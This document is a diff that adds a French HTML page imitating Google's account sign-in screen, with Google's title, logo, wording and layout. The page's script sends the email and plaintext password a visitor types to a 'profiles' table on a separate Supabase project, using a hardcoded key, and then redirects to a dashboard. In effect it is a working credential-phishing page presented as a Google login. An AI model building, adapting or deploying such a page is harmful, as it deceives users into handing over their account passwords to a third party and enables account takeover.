@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Connexion – Comptes Google</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: "Google Sans", Roboto, Arial, sans-serif;
+    background: #f0f4f9;
+    color: #1f1f1f;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+  }
+
+  .card {
+    background: #fff;
+    border-radius: 28px;
+    width: 100%;
+    max-width: 1040px;
+    padding: 36px 36px 36px;
+    display: flex;
+    gap: 48px;
+  }
+
+  .left { flex: 1; }
+  .right { flex: 1; padding-top: 48px; }
+
+  /* Logo (remplace le contenu de .logo par ton SVG) */
+  .logo svg { width: 48px; height: 48px; display: block; }
+
+  h1 {
+    font-size: 36px;
+    font-weight: 400;
+    margin: 20px 0 12px;
+  }
+  .subtitle { font-size: 16px; line-height: 24px; }
+
+  .field { position: relative; margin-bottom: 8px; }
+  .field input {
+    width: 100%;
+    height: 56px;
+    border: 1px solid #747775;
+    border-radius: 4px;
+    padding: 13px 15px;
+    font-size: 16px;
+    outline: none;
+    background: transparent;
+  }
+  .field label {
+    position: absolute;
+    left: 12px;
+    top: 17px;
+    padding: 0 4px;
+    background: #fff;
+    color: #5f6368;
+    font-size: 16px;
+    pointer-events: none;
+    transition: all .15s ease;
+  }
+  .field input:focus { border: 2px solid #0b57d0; padding: 12px 14px; }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label {
+    top: -9px;
+    font-size: 12px;
+  }
+  .field input:focus + label { color: #0b57d0; }
+
+  .form-error {
+    background: #fce8e6;
+    color: #b3261e;
+    border: 1px solid #f5c2bc;
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-size: 13px;
+    line-height: 18px;
+    margin-bottom: 16px;
+  }
+
+  .btn-primary[disabled] { background: #a8c7fa; cursor: default; }
+
+  .field-password { margin-top: 20px; }
+  .show-pass {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 14px;
+    color: #1f1f1f;
+    cursor: pointer;
+    margin: 12px 0 4px;
+  }
+  .show-pass input { width: 18px; height: 18px; accent-color: #0b57d0; cursor: pointer; }
+
+  .link {
+    color: #0b57d0;
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+    display: inline-block;
+    padding: 8px 0;
+  }
+  .link:hover { text-decoration: underline; }
+
+  .info {
+    font-size: 14px;
+    color: #444746;
+    line-height: 20px;
+    margin: 36px 0 0;
+  }
+
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    gap: 8px;
+    margin-top: 48px;
+  }
+  .btn {
+    border: none;
+    border-radius: 100px;
+    height: 40px;
+    padding: 0 24px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn-text { background: transparent; color: #0b57d0; }
+  .btn-text:hover { background: #ecf3fe; }
+  .btn-primary { background: #0b57d0; color: #fff; }
+  .btn-primary:hover { background: #0a4cb8; box-shadow: 0 1px 3px rgba(0,0,0,.3); }
+
+  footer {
+    width: 100%;
+    max-width: 1040px;
+    display: flex;
+    justify-content: space-between;
+    padding: 24px 12px 0;
+    font-size: 12px;
+    color: #444746;
+  }
+  footer .links { display: flex; gap: 8px; }
+  footer a {
+    color: #444746;
+    text-decoration: none;
+    padding: 8px 12px;
+    border-radius: 4px;
+  }
+  footer a:hover { background: #e1e5ea; }
+  footer select {
+    border: none;
+    background: transparent;
+    font-size: 12px;
+    color: #444746;
+    padding: 8px;
+    cursor: pointer;
+  }
+
+  @media (max-width: 800px) {
+    body { background: #fff; justify-content: flex-start; }
+    .card { flex-direction: column; gap: 24px; padding: 24px 8px; }
+    .right { padding-top: 0; }
+    h1 { font-size: 28px; }
+    footer { flex-direction: column; align-items: flex-start; }
+  }
+</style>
+</head>
+<body>
+
+  <main class="card">
+    <section class="left">
+      <!-- ===== LOGO : remplace ce SVG par le tien ===== -->
+      <div class="logo">
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+      </div>
+      <!-- ============================================== -->
+
+      <h1>Connexion</h1>
+      <p class="subtitle">Utiliser votre compte Google</p>
+    </section>
+
+    <section class="right">
+      <form id="login-form">
+        <p id="form-error" class="form-error" hidden></p>
+        <div class="field">
+          <input type="email" id="email" placeholder=" " autocomplete="username" required>
+          <label for="email">Adresse e-mail ou numéro de téléphone</label>
+        </div>
+        <a href="#" class="link">Adresse e-mail oubliée ?</a>
+
+        <div class="field field-password">
+          <input type="password" id="password" placeholder=" " autocomplete="current-password" required>
+          <label for="password">Mot de passe</label>
+        </div>
+        <label class="show-pass">
+          <input type="checkbox" onchange="document.getElementById('password').type = this.checked ? 'text' : 'password'">
+          Afficher le mot de passe
+        </label>
+        <a href="#" class="link">Mot de passe oublié ?</a>
+
+        <p class="info">
+          Ce n'est pas votre ordinateur ? Utilisez une fenêtre de navigation privée pour vous connecter.
+          <br><a href="#" class="link">En savoir plus sur l'utilisation du mode Invité</a>
+        </p>
+
+        <div class="actions">
+          <button type="button" class="btn btn-text">Créer un compte</button>
+          <button type="submit" class="btn btn-primary">Se connecter</button>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <select aria-label="Langue">
+      <option>Français (France)</option>
+      <option>English (United States)</option>
+    </select>
+    <div class="links">
+      <a href="#">Aide</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Conditions</a>
+    </div>
+  </footer>
+
+  <script>
+    // ===== Configuration Supabase =====
+    const SUPABASE_URL = "https://eqslurqbdgfgnjvrmfkf.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_tBzVUanIX0HplyKIOWbWtA_0SLauC60";
+    // ===================================
+
+    const form = document.getElementById("login-form");
+    const errorBox = document.getElementById("form-error");
+    const submitBtn = form.querySelector(".btn-primary");
+
+    function showError(message) {
+      errorBox.textContent = message;
+      errorBox.hidden = false;
+    }
+
+    function hideError() {
+      errorBox.hidden = true;
+    }
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      hideError();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (!email || !password) {
+        showError("Veuillez renseigner l'e-mail et le mot de passe.");
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Connexion...";
+
+      try {
+        const response = await fetch(
+          `${SUPABASE_URL}/rest/v1/profiles`,
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "apikey": SUPABASE_KEY,
+              "Authorization": `Bearer ${SUPABASE_KEY}`,
+              "Prefer": "return=representation"
+            },
+            body: JSON.stringify({ email, password })
+          }
+        );
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          // Supabase renvoie souvent { message } ou { hint }
+          const message = data.message || data.hint || "Une erreur est survenue.";
+          showError(message);
+          return;
+        }
+
+        // Ligne insérée avec succès dans la table "profiles"
+        console.log("Profil enregistré :", data);
+
+        // Redirige vers la page après connexion (adapte le chemin)
+        window.location.href = "dashboard.html";
+
+      } catch (err) {
+        showError("Impossible de contacter le serveur. Vérifiez votre connexion.");
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Se connecter";
+      }
+    });
+  </script>
+
+</body>
+</html>
